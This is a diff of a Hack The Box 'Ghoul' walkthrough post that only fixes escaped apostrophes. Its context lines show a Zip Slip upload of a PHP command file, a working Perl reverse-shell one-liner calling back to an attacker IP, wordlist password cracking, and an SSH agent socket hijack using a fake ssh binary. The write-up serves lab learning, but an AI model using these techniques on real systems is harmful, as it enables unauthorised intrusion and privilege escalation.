@@ -161,7 +161,7 @@ In any case, you need to craft a Zip file that contains several levels of direct
 
 To create the malicious Zip file, we can use [`evilarc`](https://github.com/ptoomey3/evilarc). What kind of file do we put inside the Zip file? PHP of course. Remember that Apache/PHP runs behind `80/tcp`?
 
-Let\'s zip this little bad boy.
+Let's zip this little bad boy.
 
 <div class="filename"><span>cmd.php</span></div>
 
@@ -185,23 +185,23 @@ Bam. We have remote command execution alright.
 
 ## Low-Privilege Shell
 
-From here on, it\'s easy to get a shell. I'm using the following Perl one-liner.
+From here on, it's easy to get a shell. I'm using the following Perl one-liner.
 
 ```
 perl -e 'use Socket;$i="10.10.14.11";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 ```
 
-It\'s best to `urlencode` the one-liner to prevent any complications when passing it as an URL. On my `nc` listener, a shell appears...
+It's best to `urlencode` the one-liner to prevent any complications when passing it as an URL. On my `nc` listener, a shell appears...
 
 <a class="image-popup">
 ![5e81818d.png](/assets/images/posts/ghoul-htb-walkthrough/5e81818d.png)
 </a>
 
-It\'s equally easy to [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to a full TTY.
+It's equally easy to [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to a full TTY.
 
-During enumeration of the `www-data` account, you\'ll realize that `8080/tcp` is running as `root`. As such, we can use Zip Slip to write to anywhere, e.g. `/etc/sudoers.d`. Wait a tick, it can't be that easy right? Well, that's because we are inside a docker container.
+During enumeration of the `www-data` account, you'll realize that `8080/tcp` is running as `root`. As such, we can use Zip Slip to write to anywhere, e.g. `/etc/sudoers.d`. Wait a tick, it can't be that easy right? Well, that's because we are inside a docker container.
 
-Here\'s a snippet of the output of `mount`. It has all the hallmarks of a docker container.
+Here's a snippet of the output of `mount`. It has all the hallmarks of a docker container.
 
 <a class="image-popup">
 ![c3b6c4ed.png](/assets/images/posts/ghoul-htb-walkthrough/c3b6c4ed.png)
@@ -259,7 +259,7 @@ The first step of port-scanning is to determine your targets whether they are up
 ![cf148e9f.png](/assets/images/posts/ghoul-htb-walkthrough/cf148e9f.png)
 </a>
 
-Aogiri has an IP of `172.20.0.10/16`. Let\'s use the following command to `ping` the entire `/24` subnet to see who's alive.
+Aogiri has an IP of `172.20.0.10/16`. Let's use the following command to `ping` the entire `/24` subnet to see who's alive.
 
 <a class="image-popup">
 ![0a6ad143.png](/assets/images/posts/ghoul-htb-walkthrough/0a6ad143.png)
@@ -315,7 +315,7 @@ fi
 
 The first argument is the key; the second argument is the attempted password. Combine this script with [GNU Parallel](https://www.gnu.org/software/parallel/) and a good wordlist, and you got yourself a powerful, multi-threaded cracker of sorts. :laughing:
 
-Well, I\'ve tried the famed wordlist `rockyou.txt` with no luck. Then it dawned upon me that the wordlist could come from the site. Remember the secret chat group? We can use `cewl` to extract a wordlist from it.
+Well, I've tried the famed wordlist `rockyou.txt` with no luck. Then it dawned upon me that the wordlist could come from the site. Remember the secret chat group? We can use `cewl` to extract a wordlist from it.
 
 <a class="image-popup">
 ![f0cc9e8a.png](/assets/images/posts/ghoul-htb-walkthrough/f0cc9e8a.png)
@@ -323,7 +323,7 @@ Well, I\'ve tried the famed wordlist `rockyou.txt` with no luck. Then it dawned 
 
 Lame, I know.
 
-### Kaneki\'s PC (172.20.0.150)
+### Kaneki's PC (172.20.0.150)
 
 Time to test our log in.
 
@@ -337,7 +337,7 @@ Indeed! And guess what, more clues.
 ![2aa07839.png](/assets/images/posts/ghoul-htb-walkthrough/2aa07839.png)
 </a>
 
-It shouldn\'t come as a surprise, but `kaneki-pc` is dual-homed.
+It shouldn't come as a surprise, but `kaneki-pc` is dual-homed.
 
 <a class="image-popup">
 ![0e5cbd03.png](/assets/images/posts/ghoul-htb-walkthrough/0e5cbd03.png)
@@ -600,7 +600,7 @@ Notice that `/usr/local/bin` is at a higher executable search priority than `/us
 
 Once the "fake" `ssh` is executed, the path to the Unix socket used for communicating with the agent is saved to `/tmp/evil`.
 
-We can set up a `watch` on `w` to monitor who logs in to `kaneki-pc`. The moment `kaneki_adm` logs in to execute `ssh root@172.18.0.1 -p 2222 -t ./log.sh`, we\'ll execute the following script to hijack that socket and use it to log in as `root` to `172.18.0.1` at `2222/tcp`.
+We can set up a `watch` on `w` to monitor who logs in to `kaneki-pc`. The moment `kaneki_adm` logs in to execute `ssh root@172.18.0.1 -p 2222 -t ./log.sh`, we'll execute the following script to hijack that socket and use it to log in as `root` to `172.18.0.1` at `2222/tcp`.
 
 ```bash
 #!/bin/bash
